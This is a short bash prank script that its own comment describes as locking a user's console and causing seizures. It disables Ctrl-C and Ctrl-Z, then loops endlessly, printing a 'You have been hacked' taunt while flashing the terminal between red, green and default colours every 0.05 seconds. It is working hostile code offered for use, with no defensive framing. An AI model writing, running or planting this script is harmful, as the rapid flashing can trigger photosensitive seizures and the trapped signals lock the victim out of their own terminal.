#!/bin/bash
### Nifty little script that locks user's console and causes seizures###
trap '' INT TSTP
switch=1

while [ : ]
do
        tput cup 11 25
        echo "You have been hacked by the best, stay frosty"
        sleep 0.05s
        if (("$switch" == 1)); then
                echo -e "\e[49m' '\e[8]' '\e[H\e[J"
                switch=2
                continue
        fi
        if (("$switch" == 2)); then
                echo -e "\e[42m' '\e[8]' '\e[H\e[J"
                switch=3
                continue
        else
                echo -e "\e[41m' '\e[8]' '\e[H\e[J"
                switch=1
                continue
        fi

done
